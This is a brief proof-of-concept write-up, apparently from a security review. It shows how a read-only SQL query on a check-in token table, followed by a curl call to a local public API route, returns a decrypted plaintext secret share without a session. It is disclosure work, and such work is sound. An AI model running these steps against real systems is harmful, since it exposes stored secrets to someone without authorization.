# PoC — read-only DB token to plaintext share

PoC-Status: theoretical

In an isolated environment, obtain an unexpired row with read-only SQL access:

```sql
SELECT secret_id, token
FROM check_in_tokens
WHERE expires_at > now()
LIMIT 1;
```

Then request the public route:

```bash
curl -sS "http://127.0.0.1:5173/api/secrets/SECRET_ID/server-share?token=TOKEN"
```

Expected result: HTTP 200 with a plaintext `serverShare`, even without an application session. The route verifies the exact plaintext token, decrypts the stored share using the process key, and returns it.

No production database or token was accessed.
